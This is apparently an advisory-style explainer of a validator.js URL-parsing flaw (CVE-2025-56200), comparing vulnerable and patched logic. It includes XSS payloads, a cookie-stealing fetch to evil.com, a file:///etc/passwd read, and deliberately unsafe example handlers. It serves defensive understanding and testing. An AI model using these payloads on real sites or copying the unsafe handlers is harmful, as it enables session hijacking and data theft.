# CVE-2025-56200 Visual Demonstration

## How the Vulnerability Works

### Parsing Comparison: `javascript:alert(1)`

```
┌─────────────────────────────────────────────────────────────┐
│                    URL: javascript:alert(1)                 │
└─────────────────────────────────────────────────────────────┘

┌────────────────────────────── BROWSER ──────────────────────────────┐
│                                                                      │
│  RFC 3986 Parsing:                                                   │
│  ┌──────────────────────────────────────────────────────────┐       │
│  │  javascript  :  alert(1)                                 │       │
│  │  └────┬────┘  │  └───┬───┘                              │       │
│  │    PROTOCOL   │   REMAINDER                              │       │
│  │               │                                           │       │
│  │           DELIMITER                                       │       │
│  └──────────────────────────────────────────────────────────┘       │
│                                                                      │
│  Result: Protocol detected = "javascript:"                           │
│  Action: Execute JavaScript → alert(1) 💀 DANGEROUS!                │
│                                                                      │
└──────────────────────────────────────────────────────────────────────┘

┌────────────────────── VALIDATOR.JS (VULNERABLE) ────────────────────┐
│                                                                      │
│  Code: split = url.split('://')                                     │
│  ┌──────────────────────────────────────────────────────────┐       │
│  │  javascript:alert(1)                                     │       │
│  │  └─────────────┬──────────────┘                         │       │
│  │           LOOKING FOR "://"                              │       │
│  │           NOT FOUND!                                     │       │
│  └──────────────────────────────────────────────────────────┘       │
│                                                                      │
│  Result: split.length = 1                                            │
│  Interpretation: NO PROTOCOL DETECTED ❌                            │
│  Action: Treat as hostname/path → May PASS validation ✓             │
│                                                                      │
└──────────────────────────────────────────────────────────────────────┘

┌──────────────────────── VALIDATOR.JS (PATCHED) ─────────────────────┐
│                                                                      │
│  Code: url.match(/^([a-zA-Z][a-zA-Z0-9+.\-]*):(.*)$/)               │
│  ┌──────────────────────────────────────────────────────────┐       │
│  │  javascript  :  alert(1)                                 │       │
│  │  └────┬────┘  │  └───┬───┘                              │       │
│  │    PROTOCOL   │   REMAINDER                              │       │
│  └──────────────────────────────────────────────────────────┘       │
│                                                                      │
│  Result: protocol = "javascript", remainder = "alert(1)"             │
│  Check: remainder.startsWith('//') ? NO                              │
│  Interpretation: NON-AUTHORITY URI 🚫                               │
│  Action: return false → REJECTED ✓ SECURE!                          │
│                                                                      │
└──────────────────────────────────────────────────────────────────────┘


🔥 VULNERABILITY: Browser and validator.js disagree on protocol!
✅ FIX: Make validator.js match browser behavior
```

---

## Attack Scenario: XSS via JavaScript Protocol

### Step-by-Step Attack

```
┌─────────────────────────────────────────────────────────────────┐
│  STEP 1: Attacker submits malicious URL                        │
└─────────────────────────────────────────────────────────────────┘

  Attacker Input: javascript:alert(document.cookie)

       │
       │ HTTP POST /api/profile
       ▼

┌─────────────────────────────────────────────────────────────────┐
│  STEP 2: Backend validates with validator.js (VULNERABLE)      │
└─────────────────────────────────────────────────────────────────┘

  Code: validator.isURL('javascript:alert(document.cookie)')

  Parsing: url.split('://')
           └→ ['javascript:alert(document.cookie)']
           └→ split.length = 1
           └→ NO PROTOCOL DETECTED

  Result: PASS ✓ (no protocol to validate)

       │
       │ Stored in database
       ▼

┌─────────────────────────────────────────────────────────────────┐
│  STEP 3: Victim views attacker's profile                       │
└─────────────────────────────────────────────────────────────────┘

  Frontend renders:
  <a href="javascript:alert(document.cookie)">Visit Website</a>

       │
       │ User clicks link
       ▼

┌─────────────────────────────────────────────────────────────────┐
│  STEP 4: Browser parses URL                                    │
└─────────────────────────────────────────────────────────────────┘

  Browser: "javascript:" detected as protocol
  Action:  Execute JavaScript

       │
       │
       ▼

┌─────────────────────────────────────────────────────────────────┐
│  STEP 5: JavaScript executes (XSS)                             │
└─────────────────────────────────────────────────────────────────┘

  alert(document.cookie)
  └→ Cookie displayed in popup
  └→ Attacker can steal session cookies
  └→ Account takeover 💀

       │
       │
       ▼

┌─────────────────────────────────────────────────────────────────┐
│  IMPACT: Cross-Site Scripting (XSS)                            │
│  - Session hijacking                                            │
│  - Credential theft                                             │
│  - Account takeover                                             │
│  - Malware distribution                                         │
└─────────────────────────────────────────────────────────────────┘
```

### With the Patch Applied

```
┌─────────────────────────────────────────────────────────────────┐
│  STEP 1: Attacker submits malicious URL                        │
└─────────────────────────────────────────────────────────────────┘

  Attacker Input: javascript:alert(document.cookie)

       │
       │ HTTP POST /api/profile
       ▼

┌─────────────────────────────────────────────────────────────────┐
│  STEP 2: Backend validates with validator.js (PATCHED)         │
└─────────────────────────────────────────────────────────────────┘

  Code: validator.isURL('javascript:alert(document.cookie)')

  Parsing: url.match(/^([a-zA-Z][a-zA-Z0-9+.\-]*):(.*)$/)
           └→ ['javascript:alert(...)', 'javascript', 'alert(...)']
           └→ protocol = 'javascript'
           └→ remainder = 'alert(document.cookie)'
           └→ remainder.startsWith('//') ? NO
           └→ NON-AUTHORITY URI DETECTED

  Result: FAIL ✗ return false

       │
       │ HTTP 400 Bad Request
       ▼

┌─────────────────────────────────────────────────────────────────┐
│  STEP 3: Validation fails - URL rejected                       │
└─────────────────────────────────────────────────────────────────┘

  Error: "Invalid URL"
  Action: Not stored in database

       │
       │
       ▼

┌─────────────────────────────────────────────────────────────────┐
│  RESULT: Attack Prevented ✅                                   │
└─────────────────────────────────────────────────────────────────┘
```

---

## URL Parsing Comparison Table

| URL | Vulnerable Code | Patched Code | Browser | Safe? |
|-----|----------------|--------------|---------|-------|
| `http://example.com` | Protocol: `http` ✓ | Protocol: `http` ✓ | Protocol: `http` ✓ | ✅ Match |
| `https://example.com` | Protocol: `https` ✓ | Protocol: `https` ✓ | Protocol: `https` ✓ | ✅ Match |
| `ftp://example.com` | Protocol: `ftp` ✓ | Protocol: `ftp` ✓ | Protocol: `ftp` ✓ | ✅ Match |
| **`javascript:alert(1)`** | **No protocol ❌** | **Non-authority 🚫** | **Protocol: `javascript` 💀** | ✅ **FIXED** |
| **`data:text/html,...`** | **No protocol ❌** | **Non-authority 🚫** | **Protocol: `data` 💀** | ✅ **FIXED** |
| **`vbscript:msgbox(1)`** | **No protocol ❌** | **Non-authority 🚫** | **Protocol: `vbscript` 💀** | ✅ **FIXED** |
| `file:///etc/passwd` | Protocol: `file` ⚠️ | Protocol: `file` ⚠️ | Protocol: `file` ⚠️ | ⚠️ Config |
| `mailto:test@ex.com` | No protocol ❌ | Non-authority 🚫 | Protocol: `mailto` | ✅ Rejected |

Legend:
- ✓ = Correctly parsed
- ❌ = Incorrectly parsed (vulnerable)
- 🚫 = Rejected (secure)
- 💀 = Dangerous
- ⚠️ = Depends on configuration

---

## Code Flow Diagram

### Vulnerable Code Flow

```
┌──────────────────┐
│  url.split('://')│
└────────┬─────────┘
         │
    ┌────▼──────────────────┐
    │  split.length > 1 ?   │
    └────┬─────────────┬────┘
         │ YES         │ NO
         │             │
    ┌────▼─────────┐   │
    │ Extract      │   │
    │ protocol     │   │
    └────┬─────────┘   │
         │             │
    ┌────▼─────────────▼────┐
    │ Validate protocol in  │
    │ whitelist             │
    └────┬──────────────────┘
         │
    ┌────▼──────────────────┐
    │ Continue processing   │
    │ (host validation)     │
    └───────────────────────┘

❌ Problem: javascript:, data:, etc. bypass protocol detection
```

### Patched Code Flow

```
┌───────────────────────────────────────────┐
│  url.match(/^([a-zA-Z][a-zA-Z0-9+.-]*):/)  │
└────────┬──────────────────────────────────┘
         │
    ┌────▼─────────────┐
    │  Match found?    │
    └────┬────────┬────┘
         │ YES    │ NO (no protocol)
         │        │
    ┌────▼────────┴──────────┐
    │ Extract protocol &     │
    │ remainder              │
    └────┬───────────────────┘
         │
    ┌────▼────────────────────┐
    │ Validate protocol in    │
    │ whitelist               │
    └────┬───────────────┬────┘
         │ PASS          │ FAIL
         │               │
    ┌────▼───────────────▼────┐
    │ remainder.startsWith    │
    │ ('//') ?                │
    └────┬───────────────┬────┘
         │ YES           │ NO
         │               │
         │          ┌────▼─────────────┐
         │          │ return false     │
         │          │ (Non-authority)  │
         │          └──────────────────┘
         │
    ┌────▼──────────────────┐
    │ Continue processing   │
    │ (host validation)     │
    └───────────────────────┘

✅ Fix: javascript:, data:, etc. detected and rejected
```

---

## Real-World Examples

### Example 1: Social Media Profile

**Vulnerable Application:**
```javascript
// Backend API
app.post('/api/profile', (req, res) => {
  const { website } = req.body;

  // Vulnerable validation
  if (!validator.isURL(website)) {
    return res.status(400).json({ error: 'Invalid website URL' });
  }

  // Save to database
  db.updateProfile(userId, { website });
  res.json({ success: true });
});

// Frontend rendering
<div class="profile">
  <a href="${user.website}">Visit Website</a>
</div>
```

**Attack:**
```
POST /api/profile
{
  "website": "javascript:fetch('https://evil.com?c='+document.cookie)"
}

Response: { "success": true }  ← VULNERABLE!

Victim views profile:
<a href="javascript:fetch('https://evil.com?c='+document.cookie)">Visit Website</a>

Victim clicks → Cookie stolen → Session hijacked
```

**With Patch:**
```
POST /api/profile
{
  "website": "javascript:fetch('https://evil.com?c='+document.cookie)"
}

Response: { "error": "Invalid website URL" }  ← SECURE!

Attack prevented.
```

### Example 2: URL Shortener

**Vulnerable:**
```javascript
app.post('/api/shorten', (req, res) => {
  const { url } = req.body;

  if (!validator.isURL(url)) {
    return res.status(400).json({ error: 'Invalid URL' });
  }

  const shortCode = generateShortCode();
  db.saveUrl(shortCode, url);

  res.json({ shortUrl: `https://short.link/${shortCode}` });
});

app.get('/:code', (req, res) => {
  const url = db.getUrl(req.params.code);
  res.redirect(url);  // ← VULNERABLE!
});
```

**Attack:**
```
POST /api/shorten
{
  "url": "javascript:alert(document.cookie)"
}

Response: { "shortUrl": "https://short.link/abc123" }

User visits: https://short.link/abc123
Server: res.redirect('javascript:alert(document.cookie)')
Browser: Executes JavaScript → XSS
```

### Example 3: Content Scraper

**Vulnerable:**
```javascript
app.post('/api/scrape', (req, res) => {
  const { url } = req.body;

  if (!validator.isURL(url)) {
    return res.status(400).json({ error: 'Invalid URL' });
  }

  // Fetch content
  fetch(url).then(html => {
    res.json({ content: html });
  });
});
```

**Attack (SSRF-like):**
```
POST /api/scrape
{
  "url": "file:///etc/passwd"
}

If file: protocol passes validation:
→ Server reads local file
→ Returns file contents
→ Information disclosure
```

---

## Testing Instructions

### Manual Testing

1. **Before applying patch:**
   ```javascript
   const validator = require('validator');

   console.log('Test 1:', validator.isURL('javascript:alert(1)'));
   // Expected (vulnerable): May return true
   // Expected (patched): false

   console.log('Test 2:', validator.isURL('data:text/html,<script>alert(1)</script>'));
   // Expected (vulnerable): May return true
   // Expected (patched): false

   console.log('Test 3:', validator.isURL('http://example.com'));
   // Expected: true (both versions)
   ```

2. **After applying patch:**
   ```bash
   npm run build
   node test-manual.js
   ```

   All dangerous URLs should return `false`.

### Automated Testing

```bash
# Run the CVE test suite
node test-cve-2025-56200.js

# Run full test suite
npm test
```

---

## Impact Visualization

### Without Patch

```
100 URLs submitted
├─ 70 legitimate (http://, https://) → ✓ PASS (correct)
├─ 20 malformed → ✗ FAIL (correct)
└─ 10 malicious (javascript:, data:) → ✓ PASS (WRONG!) 💀

Risk: 10% of inputs are dangerous but pass validation
```

### With Patch

```
100 URLs submitted
├─ 70 legitimate (http://, https://) → ✓ PASS (correct)
├─ 20 malformed → ✗ FAIL (correct)
└─ 10 malicious (javascript:, data:) → ✗ FAIL (correct) ✅

Risk: 0% of dangerous inputs pass validation
```

---

## Summary

### The Core Issue
```
Validator: split('://')  ← Looks for TWO slashes
Browser:   Uses ':'      ← Uses ONE colon
Result:    MISMATCH      ← Security vulnerability
```

### The Solution
```
Validator: match(/^...:/)  ← Match single colon (RFC 3986)
          + Check for '//'  ← Distinguish authority vs non-authority
Browser:   Uses ':'         ← Uses single colon
Result:    MATCH            ← Secure!
```

### Key Points

1. ⚠️ **Vulnerability:** Protocol parsing mismatch
2. 💀 **Impact:** XSS via javascript:, data:, vbscript:
3. 🔧 **Fix:** RFC 3986 compliant parsing
4. ✅ **Result:** Dangerous protocols blocked
5. ✓ **Compatibility:** Legitimate URLs still work

---

**Apply the patch immediately to secure your application against XSS attacks.**
